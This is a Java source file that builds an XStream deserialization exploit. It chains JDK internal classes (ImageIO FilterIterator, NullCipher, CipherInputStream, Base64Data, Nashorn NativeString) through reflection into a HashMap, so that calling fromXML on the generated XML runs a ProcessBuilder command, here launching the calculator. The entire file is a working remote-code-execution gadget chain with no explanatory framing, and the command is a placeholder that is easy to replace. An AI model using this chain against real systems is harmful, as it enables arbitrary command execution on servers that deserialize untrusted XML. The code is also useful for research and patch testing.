import com.thoughtworks.xstream.XStream;
import sun.reflect.ReflectionFactory;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.crypto.Cipher;
import javax.crypto.CipherInputStream;
import javax.crypto.NullCipher;
import java.io.InputStream;
import java.lang.reflect.*;
import java.util.Collections;
import java.util.HashMap;

public class ImageIOPayload {
    public static void main(String[] args) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(new String[]{"open","-a","calculator"});

        Class<?> cfCl = Class.forName("javax.imageio.ImageIO$ContainsFilter");
        Constructor<?> cfCons = cfCl.getDeclaredConstructor(Method.class, String.class);
        cfCons.setAccessible(true);

        Object filterIt = makeFilterIterator(
                makeFilterIterator(Collections.emptyIterator(), pb, null),
                "foo",
                cfCons.newInstance(ProcessBuilder.class.getMethod("start"), "foo")
        );

        HashMap map = makeIteratorTriggerNative(filterIt);

        XStream xs = new XStream();
        String xml = xs.toXML(map);
        System.out.println(xml);
        xs.fromXML(xml);
    }

    public static Object makeFilterIterator(Object backingIt, Object first, Object filter) throws Exception {
        Class fiCl = Class.forName("javax.imageio.spi.FilterIterator");
        Object filterIt = createWithoutConstructor(fiCl);

        setFieldValue(filterIt, "iter", backingIt);
        setFieldValue(filterIt, "next", first);
        setFieldValue(filterIt, "filter", filter);

        return filterIt;
    }

    public static HashMap makeIteratorTriggerNative(Object it) throws Exception {
        Cipher m = (Cipher) createWithoutConstructor(NullCipher.class);

        setFieldValue(m, "serviceIterator", it);
        setFieldValue(m, "lock", new Object());

        InputStream cos = new CipherInputStream(null, m);

        Class<?> niCl = Class.forName("java.lang.ProcessBuilder$NullInputStream"); //$NON-NLS-1$
        Constructor<?> niCons = niCl.getDeclaredConstructor();
        niCons.setAccessible(true);

        setFieldValue(cos, "input", niCons.newInstance());
        setFieldValue(cos, "ibuffer", new byte[0]);

        Class c = Class.forName("com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data");
        Object b64Data = createWithoutConstructor(c);
        c = Class.forName("com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource");
        DataSource ds = (DataSource) createWithoutConstructor(c); //$NON-NLS-1$
        setFieldValue(ds, "is", cos);
        setFieldValue(b64Data, "dataHandler", new DataHandler(ds));
        setFieldValue(b64Data, "data", null);

        c = Class.forName("jdk.nashorn.internal.objects.NativeString");
        Object nativeString = createWithoutConstructor(c);
        setFieldValue(nativeString, "value", b64Data);

        return makeMap(nativeString, nativeString);
    }

    public static Object createWithoutConstructor(Class c) throws IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException {
        Constructor objCons = Object.class.getDeclaredConstructor(new Class[0]);
        objCons.setAccessible(true);
        Constructor sc = ReflectionFactory.getReflectionFactory()
                .newConstructorForSerialization(c, objCons);
        sc.setAccessible(true);
        return sc.newInstance(new Object[0]);
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = getField(obj.getClass(), fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }

    public static HashMap makeMap (Object v1, Object v2 ) throws Exception{
        HashMap s = new HashMap();
        setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);
        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        setFieldValue(s, "table", tbl);
        return s;
    }
}


